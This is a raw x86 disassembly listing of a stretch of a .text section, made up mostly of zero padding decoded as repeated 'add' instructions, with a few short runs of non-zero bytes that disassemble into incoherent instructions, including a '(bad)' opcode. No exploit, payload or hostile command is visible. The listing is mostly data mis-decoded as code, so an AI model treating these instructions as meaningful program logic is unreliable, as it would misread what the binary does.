                           .text:004019b5 00 00                            add    %al,(%eax)
                           .text:004019b7 00 00                            add    %al,(%eax)
                           .text:004019b9 00 00                            add    %al,(%eax)
                           .text:004019bb 00 00                            add    %al,(%eax)
                           .text:004019bd 00 00                            add    %al,(%eax)
                           .text:004019bf 00 00                            add    %al,(%eax)
                           .text:004019c1 00 00                            add    %al,(%eax)
                           .text:004019c3 00 00                            add    %al,(%eax)
                           .text:004019c5 00 00                            add    %al,(%eax)
                           .text:004019c7 00 00                            add    %al,(%eax)
                           .text:004019c9 00 00                            add    %al,(%eax)
                           .text:004019cb 00 00                            add    %al,(%eax)
                           .text:004019cd 00 00                            add    %al,(%eax)
                           .text:004019cf 00 00                            add    %al,(%eax)
                           .text:004019d1 00 00                            add    %al,(%eax)
                           .text:004019d3 00 00                            add    %al,(%eax)
                           .text:004019d5 00 00                            add    %al,(%eax)
                           .text:004019d7 00 00                            add    %al,(%eax)
                           .text:004019d9 00 00                            add    %al,(%eax)
                           .text:004019db 00 00                            add    %al,(%eax)
                           .text:004019dd 00 00                            add    %al,(%eax)
                           .text:004019df 00 00                            add    %al,(%eax)
                           .text:004019e1 00 00                            add    %al,(%eax)
                           .text:004019e3 00 00                            add    %al,(%eax)
                           .text:004019e5 00 00                            add    %al,(%eax)
                           .text:004019e7 00 00                            add    %al,(%eax)
                           .text:004019e9 00 00                            add    %al,(%eax)
                           .text:004019eb 00 00                            add    %al,(%eax)
                           .text:004019ed 00 00                            add    %al,(%eax)
                           .text:004019ef 00 00                            add    %al,(%eax)
                           .text:004019f1 00 00                            add    %al,(%eax)
                           .text:004019f3 00 00                            add    %al,(%eax)
                           .text:004019f5 00 00                            add    %al,(%eax)
                           .text:004019f7 00 00                            add    %al,(%eax)
                           .text:004019f9 00 00                            add    %al,(%eax)
                           .text:004019fb 00 00                            add    %al,(%eax)
                           .text:004019fd 00 00                            add    %al,(%eax)
                           .text:004019ff 00 00                            add    %al,(%eax)
                           .text:00401a01 00 00                            add    %al,(%eax)
                           .text:00401a03 00 00                            add    %al,(%eax)
                           .text:00401a05 00 00                            add    %al,(%eax)
                           .text:00401a07 00 00                            add    %al,(%eax)
                           .text:00401a09 00 00                            add    %al,(%eax)
                           .text:00401a0b 00 00                            add    %al,(%eax)
                           .text:00401a0d 00 00                            add    %al,(%eax)
                           .text:00401a0f 00 00                            add    %al,(%eax)
                           .text:00401a11 00 00                            add    %al,(%eax)
                           .text:00401a13 00 00                            add    %al,(%eax)
                           .text:00401a15 00 00                            add    %al,(%eax)
                           .text:00401a17 00 00                            add    %al,(%eax)
                           .text:00401a19 00 00                            add    %al,(%eax)
                           .text:00401a1b 00 00                            add    %al,(%eax)
                           .text:00401a1d 00 00                            add    %al,(%eax)
                           .text:00401a1f 00 00                            add    %al,(%eax)
                           .text:00401a21 00 00                            add    %al,(%eax)
                           .text:00401a23 00 00                            add    %al,(%eax)
                           .text:00401a25 00 00                            add    %al,(%eax)
                           .text:00401a27 00 00                            add    %al,(%eax)
                           .text:00401a29 00 00                            add    %al,(%eax)
                           .text:00401a2b 00 00                            add    %al,(%eax)
                           .text:00401a2d 00 00                            add    %al,(%eax)
                           .text:00401a2f 00 00                            add    %al,(%eax)
                           .text:00401a31 00 00                            add    %al,(%eax)
                           .text:00401a33 00 00                            add    %al,(%eax)
                           .text:00401a35 00 00                            add    %al,(%eax)
                           .text:00401a37 00 00                            add    %al,(%eax)
                           .text:00401a39 00 00                            add    %al,(%eax)
                           .text:00401a3b 00 00                            add    %al,(%eax)
                           .text:00401a3d 00 00                            add    %al,(%eax)
                           .text:00401a3f 00 00                            add    %al,(%eax)
                           .text:00401a41 00 00                            add    %al,(%eax)
                           .text:00401a43 00 00                            add    %al,(%eax)
                           .text:00401a45 00 00                            add    %al,(%eax)
                           .text:00401a47 00 00                            add    %al,(%eax)
                           .text:00401a49 00 00                            add    %al,(%eax)
                           .text:00401a4b 00 00                            add    %al,(%eax)
                           .text:00401a4d 00 00                            add    %al,(%eax)
                           .text:00401a4f 00 00                            add    %al,(%eax)
                           .text:00401a51 00 00                            add    %al,(%eax)
                           .text:00401a53 00 00                            add    %al,(%eax)
                           .text:00401a55 00 00                            add    %al,(%eax)
                           .text:00401a57 00 00                            add    %al,(%eax)
                           .text:00401a59 00 00                            add    %al,(%eax)
                           .text:00401a5b 00 00                            add    %al,(%eax)
                           .text:00401a5d 00 00                            add    %al,(%eax)
                           .text:00401a5f 00 00                            add    %al,(%eax)
                           .text:00401a61 00 00                            add    %al,(%eax)
                           .text:00401a63 00 00                            add    %al,(%eax)
                           .text:00401a65 00 00                            add    %al,(%eax)
                           .text:00401a67 00 00                            add    %al,(%eax)
                           .text:00401a69 00 00                            add    %al,(%eax)
                           .text:00401a6b 00 00                            add    %al,(%eax)
                           .text:00401a6d 00 00                            add    %al,(%eax)
                           .text:00401a6f 00 00                            add    %al,(%eax)
                           .text:00401a71 00 00                            add    %al,(%eax)
                           .text:00401a73 00 00                            add    %al,(%eax)
                           .text:00401a75 00 00                            add    %al,(%eax)
                           .text:00401a77 00 00                            add    %al,(%eax)
                           .text:00401a79 00 00                            add    %al,(%eax)
                           .text:00401a7b 00 00                            add    %al,(%eax)
                           .text:00401a7d 00 00                            add    %al,(%eax)
                           .text:00401a7f 00 00                            add    %al,(%eax)
                           .text:00401a81 00 00                            add    %al,(%eax)
                           .text:00401a83 00 00                            add    %al,(%eax)
                           .text:00401a85 00 00                            add    %al,(%eax)
                           .text:00401a87 00 00                            add    %al,(%eax)
                           .text:00401a89 00 00                            add    %al,(%eax)
                           .text:00401a8b 00 00                            add    %al,(%eax)
                           .text:00401a8d 00 00                            add    %al,(%eax)
                           .text:00401a8f 00 00                            add    %al,(%eax)
                           .text:00401a91 00 00                            add    %al,(%eax)
                           .text:00401a93 00 00                            add    %al,(%eax)
                           .text:00401a95 00 00                            add    %al,(%eax)
                           .text:00401a97 00 00                            add    %al,(%eax)
                           .text:00401a99 00 00                            add    %al,(%eax)
                           .text:00401a9b 00 00                            add    %al,(%eax)
                           .text:00401a9d 00 00                            add    %al,(%eax)
                           .text:00401a9f 00 00                            add    %al,(%eax)
                           .text:00401aa1 00 00                            add    %al,(%eax)
                           .text:00401aa3 00 00                            add    %al,(%eax)
                           .text:00401aa5 00 00                            add    %al,(%eax)
                           .text:00401aa7 00 00                            add    %al,(%eax)
                           .text:00401aa9 00 00                            add    %al,(%eax)
                           .text:00401aab 00 00                            add    %al,(%eax)
                           .text:00401aad 00 00                            add    %al,(%eax)
                           .text:00401aaf 00 00                            add    %al,(%eax)
                           .text:00401ab1 00 00                            add    %al,(%eax)
                           .text:00401ab3 00 00                            add    %al,(%eax)
                           .text:00401ab5 00 00                            add    %al,(%eax)
                           .text:00401ab7 00 00                            add    %al,(%eax)
                           .text:00401ab9 00 00                            add    %al,(%eax)
                           .text:00401abb 00 00                            add    %al,(%eax)
                           .text:00401abd 00 00                            add    %al,(%eax)
                           .text:00401abf 00 00                            add    %al,(%eax)
                           .text:00401ac1 00 00                            add    %al,(%eax)
                           .text:00401ac3 00 00                            add    %al,(%eax)
                           .text:00401ac5 00 00                            add    %al,(%eax)
                           .text:00401ac7 00 00                            add    %al,(%eax)
                           .text:00401ac9 00 00                            add    %al,(%eax)
                           .text:00401acb 00 00                            add    %al,(%eax)
                           .text:00401acd 00 00                            add    %al,(%eax)
                           .text:00401acf 00 00                            add    %al,(%eax)
                           .text:00401ad1 00 00                            add    %al,(%eax)
                           .text:00401ad3 00 00                            add    %al,(%eax)
                           .text:00401ad5 00 00                            add    %al,(%eax)
                           .text:00401ad7 00 00                            add    %al,(%eax)
                           .text:00401ad9 00 00                            add    %al,(%eax)
                           .text:00401adb 00 00                            add    %al,(%eax)
                           .text:00401add 00 00                            add    %al,(%eax)
                           .text:00401adf 00 00                            add    %al,(%eax)
                           .text:00401ae1 00 00                            add    %al,(%eax)
                           .text:00401ae3 00 00                            add    %al,(%eax)
                           .text:00401ae5 00 00                            add    %al,(%eax)
                           .text:00401ae7 00 00                            add    %al,(%eax)
                           .text:00401ae9 00 00                            add    %al,(%eax)
                           .text:00401aeb 00 00                            add    %al,(%eax)
                           .text:00401aed 00 00                            add    %al,(%eax)
                           .text:00401aef 00 b6 ff b7 15 4e                add    %dh,0x4e15b7ff(%esi)
                           .text:00401af5 bd f0 ab 00 93                   mov    $0x9300abf0,%ebp
                           .text:00401afa 98                               cwtl   
                           .text:00401afb b5 bf                            mov    $0xbf,%ch
                           .text:00401afd 7f 00                            jg     0x00401aff
                           .text:00401aff 00 08                            add    %cl,(%eax)
                           .text:00401b01 55                               push   %ebp
                           .text:00401b02 6d                               insl   (%dx),%es:(%edi)
                           .text:00401b03 c5 bf 7f 00 00 00                lds    0x7f(%edi),%edi
                           .text:00401b09 00 00                            add    %al,(%eax)
                           .text:00401b0b 00 00                            add    %al,(%eax)
                           .text:00401b0d 00 00                            add    %al,(%eax)
                           .text:00401b0f 00 00                            add    %al,(%eax)
                           .text:00401b11 00 00                            add    %al,(%eax)
                           .text:00401b13 00 00                            add    %al,(%eax)
                           .text:00401b15 00 00                            add    %al,(%eax)
                           .text:00401b17 00 00                            add    %al,(%eax)
                           .text:00401b19 00 00                            add    %al,(%eax)
                           .text:00401b1b 00 00                            add    %al,(%eax)
                           .text:00401b1d 00 00                            add    %al,(%eax)
                           .text:00401b1f 00 00                            add    %al,(%eax)
                           .text:00401b21 00 00                            add    %al,(%eax)
                           .text:00401b23 00 00                            add    %al,(%eax)
                           .text:00401b25 00 00                            add    %al,(%eax)
                           .text:00401b27 00 00                            add    %al,(%eax)
                           .text:00401b29 00 00                            add    %al,(%eax)
                           .text:00401b2b 00 00                            add    %al,(%eax)
                           .text:00401b2d 00 00                            add    %al,(%eax)
                           .text:00401b2f 00 00                            add    %al,(%eax)
                           .text:00401b31 00 00                            add    %al,(%eax)
                           .text:00401b33 00 00                            add    %al,(%eax)
                           .text:00401b35 00 00                            add    %al,(%eax)
                           .text:00401b37 00 00                            add    %al,(%eax)
                           .text:00401b39 00 00                            add    %al,(%eax)
                           .text:00401b3b 00 00                            add    %al,(%eax)
                           .text:00401b3d 00 00                            add    %al,(%eax)
                           .text:00401b3f 00 00                            add    %al,(%eax)
                           .text:00401b41 00 00                            add    %al,(%eax)
                           .text:00401b43 00 00                            add    %al,(%eax)
                           .text:00401b45 00 00                            add    %al,(%eax)
                           .text:00401b47 00 00                            add    %al,(%eax)
                           .text:00401b49 00 00                            add    %al,(%eax)
                           .text:00401b4b 00 00                            add    %al,(%eax)
                           .text:00401b4d 00 00                            add    %al,(%eax)
                           .text:00401b4f 00 00                            add    %al,(%eax)
                           .text:00401b51 00 00                            add    %al,(%eax)
                           .text:00401b53 00 00                            add    %al,(%eax)
                           .text:00401b55 00 00                            add    %al,(%eax)
                           .text:00401b57 00 00                            add    %al,(%eax)
                           .text:00401b59 00 00                            add    %al,(%eax)
                           .text:00401b5b 00 00                            add    %al,(%eax)
                           .text:00401b5d 00 00                            add    %al,(%eax)
                           .text:00401b5f 00 00                            add    %al,(%eax)
                           .text:00401b61 00 00                            add    %al,(%eax)
                           .text:00401b63 00 00                            add    %al,(%eax)
                           .text:00401b65 00 00                            add    %al,(%eax)
                           .text:00401b67 00 00                            add    %al,(%eax)
                           .text:00401b69 00 00                            add    %al,(%eax)
                           .text:00401b6b 00 00                            add    %al,(%eax)
                           .text:00401b6d 00 00                            add    %al,(%eax)
                           .text:00401b6f 00 00                            add    %al,(%eax)
                           .text:00401b71 00 00                            add    %al,(%eax)
                           .text:00401b73 00 00                            add    %al,(%eax)
                           .text:00401b75 00 00                            add    %al,(%eax)
                           .text:00401b77 00 00                            add    %al,(%eax)
                           .text:00401b79 00 00                            add    %al,(%eax)
                           .text:00401b7b 00 00                            add    %al,(%eax)
                           .text:00401b7d 00 00                            add    %al,(%eax)
                           .text:00401b7f 00 00                            add    %al,(%eax)
                           .text:00401b81 00 00                            add    %al,(%eax)
                           .text:00401b83 00 00                            add    %al,(%eax)
                           .text:00401b85 00 00                            add    %al,(%eax)
                           .text:00401b87 00 00                            add    %al,(%eax)
                           .text:00401b89 00 00                            add    %al,(%eax)
                           .text:00401b8b 00 00                            add    %al,(%eax)
                           .text:00401b8d 00 00                            add    %al,(%eax)
                           .text:00401b8f 00 00                            add    %al,(%eax)
                           .text:00401b91 00 00                            add    %al,(%eax)
                           .text:00401b93 00 00                            add    %al,(%eax)
                           .text:00401b95 00 00                            add    %al,(%eax)
                           .text:00401b97 00 00                            add    %al,(%eax)
                           .text:00401b99 00 00                            add    %al,(%eax)
                           .text:00401b9b 00 00                            add    %al,(%eax)
                           .text:00401b9d 00 00                            add    %al,(%eax)
                           .text:00401b9f 00 00                            add    %al,(%eax)
                           .text:00401ba1 00 00                            add    %al,(%eax)
                           .text:00401ba3 00 00                            add    %al,(%eax)
                           .text:00401ba5 00 00                            add    %al,(%eax)
                           .text:00401ba7 00 00                            add    %al,(%eax)
                           .text:00401ba9 00 00                            add    %al,(%eax)
                           .text:00401bab 00 00                            add    %al,(%eax)
                           .text:00401bad 00 00                            add    %al,(%eax)
                           .text:00401baf 00 00                            add    %al,(%eax)
                           .text:00401bb1 00 00                            add    %al,(%eax)
                           .text:00401bb3 00 00                            add    %al,(%eax)
                           .text:00401bb5 00 00                            add    %al,(%eax)
                           .text:00401bb7 00 00                            add    %al,(%eax)
                           .text:00401bb9 00 00                            add    %al,(%eax)
                           .text:00401bbb 00 00                            add    %al,(%eax)
                           .text:00401bbd 00 00                            add    %al,(%eax)
                           .text:00401bbf 00 00                            add    %al,(%eax)
                           .text:00401bc1 00 00                            add    %al,(%eax)
                           .text:00401bc3 00 00                            add    %al,(%eax)
                           .text:00401bc5 00 00                            add    %al,(%eax)
                           .text:00401bc7 00 00                            add    %al,(%eax)
                           .text:00401bc9 00 00                            add    %al,(%eax)
                           .text:00401bcb 00 00                            add    %al,(%eax)
                           .text:00401bcd 00 00                            add    %al,(%eax)
                           .text:00401bcf 00 00                            add    %al,(%eax)
                           .text:00401bd1 00 00                            add    %al,(%eax)
                           .text:00401bd3 00 00                            add    %al,(%eax)
                           .text:00401bd5 00 00                            add    %al,(%eax)
                           .text:00401bd7 00 00                            add    %al,(%eax)
                           .text:00401bd9 00 00                            add    %al,(%eax)
                           .text:00401bdb 00 00                            add    %al,(%eax)
                           .text:00401bdd 00 00                            add    %al,(%eax)
                           .text:00401bdf 00 00                            add    %al,(%eax)
                           .text:00401be1 00 00                            add    %al,(%eax)
                           .text:00401be3 00 00                            add    %al,(%eax)
                           .text:00401be5 00 00                            add    %al,(%eax)
                           .text:00401be7 00 00                            add    %al,(%eax)
                           .text:00401be9 00 00                            add    %al,(%eax)
                           .text:00401beb 00 00                            add    %al,(%eax)
                           .text:00401bed 00 00                            add    %al,(%eax)
                           .text:00401bef 00 00                            add    %al,(%eax)
                           .text:00401bf1 00 00                            add    %al,(%eax)
                           .text:00401bf3 00 00                            add    %al,(%eax)
                           .text:00401bf5 00 00                            add    %al,(%eax)
                           .text:00401bf7 00 41 2d                         add    %al,0x2d(%ecx)
                           .text:00401bfa 47                               inc    %edi
                           .text:00401bfb 9e                               sahf   
                           .text:00401bfc 9e                               sahf   
                           .text:00401bfd e9 3f 43 b0 b3                   jmp    0xb3f05f41
                           .text:00401c02 51                               push   %ecx
                           .text:00401c03 b7 bf                            mov    $0xbf,%bh
                           .text:00401c05 7f 00                            jg     0x00401c07
                           .text:00401c07 00 60 58                         add    %ah,0x58(%eax)
                           .text:00401c0a 70 00                            jo     0x00401c0c
                           .text:00401c0c 00 00                            add    %al,(%eax)
                           .text:00401c0e 00 00                            add    %al,(%eax)
                           .text:00401c10 00 00                            add    %al,(%eax)
                           .text:00401c12 00 00                            add    %al,(%eax)
                           .text:00401c14 00 00                            add    %al,(%eax)
                           .text:00401c16 00 00                            add    %al,(%eax)
                           .text:00401c18 00 00                            add    %al,(%eax)
                           .text:00401c1a 00 00                            add    %al,(%eax)
                           .text:00401c1c 00 00                            add    %al,(%eax)
                           .text:00401c1e 00 00                            add    %al,(%eax)
                           .text:00401c20 00 00                            add    %al,(%eax)
                           .text:00401c22 00 00                            add    %al,(%eax)
                           .text:00401c24 00 00                            add    %al,(%eax)
                           .text:00401c26 00 00                            add    %al,(%eax)
                           .text:00401c28 00 00                            add    %al,(%eax)
                           .text:00401c2a 00 00                            add    %al,(%eax)
                           .text:00401c2c 00 00                            add    %al,(%eax)
                           .text:00401c2e 00 00                            add    %al,(%eax)
                           .text:00401c30 00 00                            add    %al,(%eax)
                           .text:00401c32 00 00                            add    %al,(%eax)
                           .text:00401c34 00 00                            add    %al,(%eax)
                           .text:00401c36 00 00                            add    %al,(%eax)
                           .text:00401c38 00 00                            add    %al,(%eax)
                           .text:00401c3a 00 00                            add    %al,(%eax)
                           .text:00401c3c 00 00                            add    %al,(%eax)
                           .text:00401c3e 00 00                            add    %al,(%eax)
                           .text:00401c40 00 00                            add    %al,(%eax)
                           .text:00401c42 00 00                            add    %al,(%eax)
                           .text:00401c44 00 00                            add    %al,(%eax)
                           .text:00401c46 00 00                            add    %al,(%eax)
                           .text:00401c48 00 00                            add    %al,(%eax)
                           .text:00401c4a 00 00                            add    %al,(%eax)
                           .text:00401c4c 00 00                            add    %al,(%eax)
                           .text:00401c4e 00 00                            add    %al,(%eax)
                           .text:00401c50 00 00                            add    %al,(%eax)
                           .text:00401c52 00 00                            add    %al,(%eax)
                           .text:00401c54 00 00                            add    %al,(%eax)
                           .text:00401c56 00 00                            add    %al,(%eax)
                           .text:00401c58 00 00                            add    %al,(%eax)
                           .text:00401c5a 00 00                            add    %al,(%eax)
                           .text:00401c5c 00 00                            add    %al,(%eax)
                           .text:00401c5e 00 00                            add    %al,(%eax)
                           .text:00401c60 00 00                            add    %al,(%eax)
                           .text:00401c62 00 00                            add    %al,(%eax)
                           .text:00401c64 00 00                            add    %al,(%eax)
                           .text:00401c66 00 00                            add    %al,(%eax)
                           .text:00401c68 00 00                            add    %al,(%eax)
                           .text:00401c6a 00 00                            add    %al,(%eax)
                           .text:00401c6c 00 00                            add    %al,(%eax)
                           .text:00401c6e 00 00                            add    %al,(%eax)
                           .text:00401c70 46                               inc    %esi
                           .text:00401c71 b1 34                            mov    $0x34,%cl
                           .text:00401c73 ec                               in     (%dx),%al
                           .text:00401c74 83 00 cf                         addl   $0xffffffcf,(%eax)
                           .text:00401c77 30 a0 92 98 b5 bf                xor    %ah,-0x404a676e(%eax)
                           .text:00401c7d 7f 00                            jg     0x00401c7f
                           .text:00401c7f 00 b0 58 70 00 00                add    %dh,0x7058(%eax)
                           .text:00401c85 00 00                            add    %al,(%eax)
                           .text:00401c87 00 00                            add    %al,(%eax)
                           .text:00401c89 00 00                            add    %al,(%eax)
                           .text:00401c8b 00 00                            add    %al,(%eax)
                           .text:00401c8d 00 00                            add    %al,(%eax)
                           .text:00401c8f 00 00                            add    %al,(%eax)
                           .text:00401c91 00 00                            add    %al,(%eax)
                           .text:00401c93 00 00                            add    %al,(%eax)
                           .text:00401c95 00 00                            add    %al,(%eax)
                           .text:00401c97 00 00                            add    %al,(%eax)
                           .text:00401c99 00 00                            add    %al,(%eax)
                           .text:00401c9b 00 00                            add    %al,(%eax)
                           .text:00401c9d 00 00                            add    %al,(%eax)
                           .text:00401c9f 00 00                            add    %al,(%eax)
                           .text:00401ca1 00 00                            add    %al,(%eax)
                           .text:00401ca3 00 00                            add    %al,(%eax)
                           .text:00401ca5 00 00                            add    %al,(%eax)
                           .text:00401ca7 00 00                            add    %al,(%eax)
                           .text:00401ca9 00 00                            add    %al,(%eax)
                           .text:00401cab 00 00                            add    %al,(%eax)
                           .text:00401cad 00 00                            add    %al,(%eax)
                           .text:00401caf 00 00                            add    %al,(%eax)
                           .text:00401cb1 00 00                            add    %al,(%eax)
                           .text:00401cb3 00 00                            add    %al,(%eax)
                           .text:00401cb5 00 00                            add    %al,(%eax)
                           .text:00401cb7 00 00                            add    %al,(%eax)
                           .text:00401cb9 00 00                            add    %al,(%eax)
                           .text:00401cbb 00 00                            add    %al,(%eax)
                           .text:00401cbd 00 00                            add    %al,(%eax)
                           .text:00401cbf 00 00                            add    %al,(%eax)
                           .text:00401cc1 00 00                            add    %al,(%eax)
                           .text:00401cc3 00 00                            add    %al,(%eax)
                           .text:00401cc5 00 00                            add    %al,(%eax)
                           .text:00401cc7 00 00                            add    %al,(%eax)
                           .text:00401cc9 00 00                            add    %al,(%eax)
                           .text:00401ccb 00 00                            add    %al,(%eax)
                           .text:00401ccd 00 00                            add    %al,(%eax)
                           .text:00401ccf 00 00                            add    %al,(%eax)
                           .text:00401cd1 00 00                            add    %al,(%eax)
                           .text:00401cd3 00 00                            add    %al,(%eax)
                           .text:00401cd5 00 00                            add    %al,(%eax)
                           .text:00401cd7 00 00                            add    %al,(%eax)
                           .text:00401cd9 00 00                            add    %al,(%eax)
                           .text:00401cdb 00 00                            add    %al,(%eax)
                           .text:00401cdd 00 00                            add    %al,(%eax)
                           .text:00401cdf 00 00                            add    %al,(%eax)
                           .text:00401ce1 00 00                            add    %al,(%eax)
                           .text:00401ce3 00 00                            add    %al,(%eax)
                           .text:00401ce5 00 00                            add    %al,(%eax)
                           .text:00401ce7 00 00                            add    %al,(%eax)
                           .text:00401ce9 00 00                            add    %al,(%eax)
                           .text:00401ceb 00 00                            add    %al,(%eax)
                           .text:00401ced 00 00                            add    %al,(%eax)
                           .text:00401cef 00 00                            add    %al,(%eax)
                           .text:00401cf1 00 00                            add    %al,(%eax)
                           .text:00401cf3 00 00                            add    %al,(%eax)
                           .text:00401cf5 00 00                            add    %al,(%eax)
                           .text:00401cf7 00 00                            add    %al,(%eax)
                           .text:00401cf9 00 00                            add    %al,(%eax)
                           .text:00401cfb 00 00                            add    %al,(%eax)
                           .text:00401cfd 00 00                            add    %al,(%eax)
                           .text:00401cff 00 00                            add    %al,(%eax)
                           .text:00401d01 00 00                            add    %al,(%eax)
                           .text:00401d03 00 00                            add    %al,(%eax)
                           .text:00401d05 00 00                            add    %al,(%eax)
                           .text:00401d07 00 00                            add    %al,(%eax)
                           .text:00401d09 00 00                            add    %al,(%eax)
                           .text:00401d0b 00 00                            add    %al,(%eax)
                           .text:00401d0d 00 00                            add    %al,(%eax)
                           .text:00401d0f 00 00                            add    %al,(%eax)
                           .text:00401d11 00 00                            add    %al,(%eax)
                           .text:00401d13 00 00                            add    %al,(%eax)
                           .text:00401d15 00 00                            add    %al,(%eax)
                           .text:00401d17 00 00                            add    %al,(%eax)
                           .text:00401d19 00 00                            add    %al,(%eax)
                           .text:00401d1b 00 00                            add    %al,(%eax)
                           .text:00401d1d 00 00                            add    %al,(%eax)
                           .text:00401d1f 00 00                            add    %al,(%eax)
                           .text:00401d21 00 00                            add    %al,(%eax)
                           .text:00401d23 00 00                            add    %al,(%eax)
                           .text:00401d25 00 00                            add    %al,(%eax)
                           .text:00401d27 00 00                            add    %al,(%eax)
                           .text:00401d29 00 00                            add    %al,(%eax)
                           .text:00401d2b 00 00                            add    %al,(%eax)
                           .text:00401d2d 00 00                            add    %al,(%eax)
                           .text:00401d2f 00 00                            add    %al,(%eax)
                           .text:00401d31 00 00                            add    %al,(%eax)
                           .text:00401d33 00 00                            add    %al,(%eax)
                           .text:00401d35 00 00                            add    %al,(%eax)
                           .text:00401d37 00 00                            add    %al,(%eax)
                           .text:00401d39 00 00                            add    %al,(%eax)
                           .text:00401d3b 00 00                            add    %al,(%eax)
                           .text:00401d3d 00 00                            add    %al,(%eax)
                           .text:00401d3f 00 00                            add    %al,(%eax)
                           .text:00401d41 00 00                            add    %al,(%eax)
                           .text:00401d43 00 00                            add    %al,(%eax)
                           .text:00401d45 00 00                            add    %al,(%eax)
                           .text:00401d47 00 00                            add    %al,(%eax)
                           .text:00401d49 00 00                            add    %al,(%eax)
                           .text:00401d4b 00 00                            add    %al,(%eax)
                           .text:00401d4d 00 00                            add    %al,(%eax)
                           .text:00401d4f 00 00                            add    %al,(%eax)
                           .text:00401d51 00 00                            add    %al,(%eax)
                           .text:00401d53 00 00                            add    %al,(%eax)
                           .text:00401d55 00 00                            add    %al,(%eax)
                           .text:00401d57 00 00                            add    %al,(%eax)
                           .text:00401d59 00 00                            add    %al,(%eax)
                           .text:00401d5b 00 00                            add    %al,(%eax)
                           .text:00401d5d 00 00                            add    %al,(%eax)
                           .text:00401d5f 00 50 e8                         add    %dl,-0x18(%eax)
                           .text:00401d62 a8 25                            test   $0x25,%al
                           .text:00401d64 8f                               (bad)  
                           .text:00401d65 f3 5d                            repz pop %ebp
                           .text:00401d67 53                               push   %ebx
                           .text:00401d68 60                               pusha  
                           .text:00401d69 93                               xchg   %eax,%ebx
                           .text:00401d6a 98                               cwtl   
                           .text:00401d6b b5 bf                            mov    $0xbf,%ch
                           .text:00401d6d 7f 00                            jg     0x00401d6f
                           .text:00401d6f 00 80 58 70 00 00                add    %al,0x7058(%eax)
                           .text:00401d75 00 00                            add    %al,(%eax)
                           .text:00401d77 00 00                            add    %al,(%eax)
                           .text:00401d79 00 00                            add    %al,(%eax)
                           .text:00401d7b 00 00                            add    %al,(%eax)
                           .text:00401d7d 00 00                            add    %al,(%eax)
                           .text:00401d7f 00 00                            add    %al,(%eax)
                           .text:00401d81 00 00                            add    %al,(%eax)
                           .text:00401d83 00 00                            add    %al,(%eax)
                           .text:00401d85 00 00                            add    %al,(%eax)
                           .text:00401d87 00 00                            add    %al,(%eax)
                           .text:00401d89 00 00                            add    %al,(%eax)
                           .text:00401d8b 00 00                            add    %al,(%eax)
                           .text:00401d8d 00 00                            add    %al,(%eax)
                           .text:00401d8f 00 00                            add    %al,(%eax)
                           .text:00401d91 00 00                            add    %al,(%eax)
                           .text:00401d93 00 00                            add    %al,(%eax)
                           .text:00401d95 00 00                            add    %al,(%eax)
                           .text:00401d97 00 00                            add    %al,(%eax)
                           .text:00401d99 00 00                            add    %al,(%eax)
                           .text:00401d9b 00 00                            add    %al,(%eax)
                           .text:00401d9d 00 00                            add    %al,(%eax)
                           .text:00401d9f 00 00                            add    %al,(%eax)
                           .text:00401da1 00 00                            add    %al,(%eax)
                           .text:00401da3 00 00                            add    %al,(%eax)
                           .text:00401da5 00 00                            add    %al,(%eax)
                           .text:00401da7 00 d3                            add    %dl,%bl
                           .text:00401da9 88 a6 73 f8 10 10                mov    %ah,0x1010f873(%esi)
                           .text:00401daf 46                               inc    %esi
                           .text:00401db0 30 93 98 b5 bf 7f                xor    %dl,0x7fbfb598(%ebx)
                           .text:00401db6 00 00                            add    %al,(%eax)
                           .text:00401db8 b0 58                            mov    $0x58,%al
                           .text:00401dba 70 00                            jo     0x00401dbc
                           .text:00401dbc 00 00                            add    %al,(%eax)
                           .text:00401dbe 00 00                            add    %al,(%eax)
                           .text:00401dc0 00 00                            add    %al,(%eax)
                           .text:00401dc2 00 00                            add    %al,(%eax)
                           .text:00401dc4 00 00                            add    %al,(%eax)
                           .text:00401dc6 00 00                            add    %al,(%eax)
                           .text:00401dc8 00 00                            add    %al,(%eax)
                           .text:00401dca 00 00                            add    %al,(%eax)
                           .text:00401dcc 00 00                            add    %al,(%eax)
                           .text:00401dce 00 00                            add    %al,(%eax)
                           .text:00401dd0 00 00                            add    %al,(%eax)
                           .text:00401dd2 00 00                            add    %al,(%eax)
                           .text:00401dd4 00 00                            add    %al,(%eax)
                           .text:00401dd6 00 00                            add    %al,(%eax)
                           .text:00401dd8 55                               push   %ebp
                           .text:00401dd9 27                               daa    
                           .text:00401dda b1 76                            mov    $0x76,%cl
                           .text:00401ddc 2a f8                            sub    %al,%bh
                           .text:00401dde 61                               popa   
                           .text:00401ddf df e8                            fucomip %st(0),%st
                           .text:00401de1 b3 51                            mov    $0x51,%bl
                           .text:00401de3 b7 bf                            mov    $0xbf,%bh
                           .text:00401de5 7f 00                            jg     0x00401de7
                           .text:00401de7 00 08                            add    %cl,(%eax)
                           .text:00401de9 55                               push   %ebp
                           .text:00401dea 6d                               insl   (%dx),%es:(%edi)
                           .text:00401deb c5 bf 7f 00 00 00                lds    0x7f(%edi),%edi
                           .text:00401df1 00 00                            add    %al,(%eax)
                           .text:00401df3 00 00                            add    %al,(%eax)
                           .text:00401df5 00 00                            add    %al,(%eax)
                           .text:00401df7 00 00                            add    %al,(%eax)
                           .text:00401df9 00 00                            add    %al,(%eax)
                           .text:00401dfb 00 00                            add    %al,(%eax)
                           .text:00401dfd 00 00                            add    %al,(%eax)
                           .text:00401dff 00 00                            add    %al,(%eax)
                           .text:00401e01 00 00                            add    %al,(%eax)
                           .text:00401e03 00 00                            add    %al,(%eax)
                           .text:00401e05 00 00                            add    %al,(%eax)
                           .text:00401e07 00 d7                            add    %dl,%bh
                           .text:00401e09 be a7 51 6b b7                   mov    $0xb76b51a7,%esi
                           .text:00401e0e 9b                               fwait
                           .text:00401e0f 56                               push   %esi
                           .text:00401e10 30 9c 98 b5 bf 7f 00             xor    %bl,0x7fbfb5(%eax,%ebx,4)
                           .text:00401e17 00 50 e0                         add    %dl,-0x20(%eax)
                           .text:00401e1a 9f                               lahf   
                           .text:00401e1b b5 bf                            mov    $0xbf,%ch
                           .text:00401e1d 7f 00                            jg     0x00401e1f
                           .text:00401e1f 00 00                            add    %al,(%eax)
                           .text:00401e21 00 00                            add    %al,(%eax)
                           .text:00401e23 00 00                            add    %al,(%eax)
                           .text:00401e25 00 00                            add    %al,(%eax)
                           .text:00401e27 00 00                            add    %al,(%eax)
                           .text:00401e29 00 00                            add    %al,(%eax)
                           .text:00401e2b 00 00                            add    %al,(%eax)
                           .text:00401e2d 00 00                            add    %al,(%eax)
                           .text:00401e2f 00 00                            add    %al,(%eax)
                           .text:00401e31 00 00                            add    %al,(%eax)
